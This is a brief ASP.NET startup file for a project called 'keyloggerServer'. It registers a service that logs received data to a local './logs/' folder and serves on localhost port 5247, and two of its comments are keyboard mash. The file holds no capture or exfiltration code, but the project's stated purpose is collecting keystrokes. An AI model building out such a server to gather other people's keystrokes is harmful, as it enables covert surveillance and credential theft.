using keyloggerServer.Services;

var builder = WebApplication.CreateBuilder(args);

// Add services to the container.

builder.Services.AddControllers();

builder.Services.AddScoped<IKeyloggerService>(sp =>
{
    string logFilePath = "./logs/";
    string logFiletype = "log";
    
    return new KeyloggerService(logFilePath,logFiletype);
});
// weqqweqweqw
var app = builder.Build();

// Configure the HTTP request pipeline.
// jakqwqwqwwqeqweeqweqwe
app.UseAuthorization();

app.MapControllers();

app.Urls.Add("http://localhost:5247"); 

app.Run();
